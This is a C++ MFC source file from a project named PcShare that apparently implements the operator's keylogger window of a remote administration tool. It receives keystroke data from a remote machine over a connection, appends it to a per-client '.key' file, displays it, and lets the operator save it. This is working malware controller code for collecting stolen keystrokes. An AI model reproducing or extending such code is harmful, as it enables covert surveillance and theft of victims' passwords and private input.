// MyKeyMWnd.cpp : implementation file
//

#include "stdafx.h"
#include "PcShare.h"
#include "MyKeyMWnd.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMyKeyMWnd

IMPLEMENT_DYNCREATE(CMyKeyMWnd, CMyBaseWnd)

CMyKeyMWnd::CMyKeyMWnd()
{
	pChildView = NULL;
	hIcon = AfxGetApp()->LoadIcon(IDI_ICON_KEYM);
}

CMyKeyMWnd::~CMyKeyMWnd()
{
}

BEGIN_MESSAGE_MAP(CMyKeyMWnd, CMyBaseWnd)
	//{{AFX_MSG_MAP(CMyKeyMWnd)
	ON_WM_CREATE()
	ON_WM_CLOSE()
	ON_COMMAND(ID_EXIT,OnClose)
	ON_COMMAND(ID_FILE_SAVE, OnSave)
	ON_UPDATE_COMMAND_UI(ID_FILE_SAVE, OnUpdateSave)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_CONNBREAK, OnConnBreak)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyKeyMWnd message handlers

LRESULT CMyKeyMWnd::OnConnBreak(WPARAM wParam, LPARAM lParam)
{
	MessageBox(_T("连接已经中断!"), PS_WARNING,  MB_OK|MB_ICONINFORMATION);
	OnClose();
	return TRUE;
}

BOOL MyAppendFile(LPCTSTR m_FileName, LPVOID pData, DWORD dLen)
{
	//取任务全局信息
	HANDLE hFile = CreateFile(
				m_FileName,  
                GENERIC_WRITE,   
                0, 
                NULL,           
                OPEN_ALWAYS,      
                FILE_ATTRIBUTE_NORMAL, 
                NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	SetFilePointer(hFile, 0, NULL, FILE_END);
	DWORD nWriteLen = 0;
	WriteFile(hFile, pData, dLen, &nWriteLen, NULL);
	FlushFileBuffers(hFile);
	CloseHandle(hFile);
	return TRUE;
}

// 线程主函数
void CMyKeyMWnd::KeyMRecv()
{
	while(1)
	{
		BYTE* pSrcData = NULL;
		DWORD nCmd = 0;
		DWORD nLen = 0;
		if(!RecvDataWithCmd(&pSrcData, &nLen, &nCmd))
		{
			PostMessage(WM_CONNBREAK, 0, 0);
			break;
		}

		TCHAR* pStrBuf = new TCHAR[nLen * 2];
		ZeroMemory(pStrBuf, sizeof(TCHAR) * nLen * 2);

#ifdef UNICODE
			MultiByteToWideChar(m_Tran.GetLoginInfo()->m_ACP, 0,	(char*) pSrcData, lstrlenA((char*) pSrcData) + 1, pStrBuf, nLen + 1);
#else
		lstrcpy(pStrBuf, (char*) pSrcData);
#endif
		char* pSaveBug = new char[nLen * 2];

		#ifdef UNICODE
			WideCharToMultiByte(CP_ACP, 0,	pStrBuf, lstrlen(pStrBuf) + 1, pSaveBug, nLen + 1, NULL, NULL);
		#else
			lstrcpy(pSaveBug, pStrBuf);
		#endif

		//追加到文件
		TCHAR m_KeyFilePath[256] = {0};
		wsprintf(m_KeyFilePath, _T("%s.key"), m_Tran.GetId());
		GetKeyFilePath(m_KeyFilePath);
		MyAppendFile(m_KeyFilePath, pSaveBug, strlen(pSaveBug));
		delete [] pSaveBug;

		pChildView->SendMessage(WM_DATA_ARRIVED, NULL, (LPARAM) pStrBuf);
		delete [] pSrcData;
		delete [] pStrBuf;
	}
}

void CMyKeyMWnd::KeyMRecvThread(LPVOID lPvoid)
{
	CMyKeyMWnd* pThis = (CMyKeyMWnd*) lPvoid;
	pThis->KeyMRecv();
}

int CMyKeyMWnd::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{
	if (CMyBaseWnd::OnCreate(lpCreateStruct) == -1)
		return -1;
	SetActiveView(pChildView);
	CXTPCommandBars* pCommandBars = GetCommandBars();
	pCommandBars->SetMenu(_T("Menu Bar"), IDR_MENU_MANA);
	return 0;
}

BOOL CMyKeyMWnd::OnCreateClient(LPCREATESTRUCT lpcs, CCreateContext* pContext) 
{
	CCreateContext pCreateContext; 
	pCreateContext.m_pCurrentFrame = this;
	pCreateContext.m_pCurrentDoc = NULL;
	pCreateContext.m_pNewViewClass = RUNTIME_CLASS(CMyKeyMEditView);
	pChildView = (CMyKeyMEditView*) CreateView(&pCreateContext, AFX_IDW_PANE_FIRST);
	pChildView->SetOwner(this);
	return TRUE;
}

BOOL CMyKeyMWnd::StartWork(LPCTSTR sCmdStr)
{
	if(!CMyBaseWnd::StartWork(sCmdStr))
	{
		return FALSE;
	}

	//追加到文件
	TCHAR m_KeyFilePath[256] = {0};
	wsprintf(m_KeyFilePath, _T("%s.key"), m_Tran.GetId());
	GetKeyFilePath(m_KeyFilePath);
	HANDLE hFile = CreateFile(
				m_KeyFilePath,  
                GENERIC_READ,   
                0, 
                NULL,           
                OPEN_EXISTING,      
                FILE_ATTRIBUTE_NORMAL, 
                NULL);
	if(hFile != INVALID_HANDLE_VALUE)
	{
		DWORD nFileSize = 0;
		nFileSize = GetFileSize(hFile, NULL);
		if(nFileSize > 0)
		{
			char* pFileBuf = new char[nFileSize + 1];
			DWORD nReadLen = 0;
			ReadFile(hFile, pFileBuf, nFileSize, &nReadLen, NULL);
			pFileBuf[nFileSize] = 0;

			TCHAR* pSaveBug = new TCHAR[nFileSize * 2];

			#ifdef UNICODE
				MultiByteToWideChar(CP_ACP, 0,	pFileBuf, strlen(pFileBuf) + 1, 
					pSaveBug, nFileSize + 1);
			#else
				lstrcpy(pSaveBug, pStrBuf);
			#endif

			pChildView->SendMessage(WM_DATA_ARRIVED, NULL, (LPARAM) pSaveBug);
			delete [] pSaveBug;
			delete [] pFileBuf;

		}
		CloseHandle(hFile);
	}

	lstrcpy(pChildView->m_SaveFile, m_KeyFilePath);

	hThreadRecv = (HANDLE) _beginthread(KeyMRecvThread, 0, this);
	return TRUE;
}

void CMyKeyMWnd::OnClose() 
{
	CMyBaseWnd::OnClose();
	if(hThreadRecv != NULL)
	{
		WaitForSingleObject(hThreadRecv, 1000);
	}
}

void CMyKeyMWnd::OnSave()
{
	CString m_Title;
	pChildView->GetWindowText(m_Title);

	OPENFILENAME OpenFileName = {0};
	TCHAR szFile[MAX_PATH] = {0};
  	TCHAR szFilter[1024] = {0};
	lstrcpy(szFilter, _T("文本文件"));
	lstrcpy(szFilter + lstrlen(szFilter) + 1, _T("*.txt"));
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
    OpenFileName.hwndOwner         = GetSafeHwnd();
	OpenFileName.lpstrFilter       = szFilter;
    OpenFileName.lpstrCustomFilter = NULL;
    OpenFileName.nMaxCustFilter    = 0;
    OpenFileName.nFilterIndex      = 0;
    OpenFileName.lpstrFile         = szFile;
    OpenFileName.nMaxFile          = sizeof(szFile);
    OpenFileName.lpstrFileTitle    = NULL;
    OpenFileName.nMaxFileTitle     = 0;
    OpenFileName.lpstrInitialDir   = NULL;
    OpenFileName.lpstrTitle        = _T("保存文件");
    OpenFileName.nFileOffset       = 0;
    OpenFileName.nFileExtension    = 0;
    OpenFileName.lpstrDefExt       = _T("txt");
    OpenFileName.Flags             = OFN_EXPLORER | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
	if(!GetSaveFileName(&OpenFileName))
	{
		return;
	}
	CFile m_File(szFile, CFile::modeCreate|CFile::modeWrite);
	m_File.Write(m_Title.LockBuffer(), m_Title.GetLength() * sizeof(TCHAR));
	m_File.Close();
}

void CMyKeyMWnd::OnUpdateSave(CCmdUI* pCmdUI) 
{
	CString m_Title;
	pChildView->GetWindowText(m_Title);
	pCmdUI->Enable(m_Title.GetLength() > 0);
}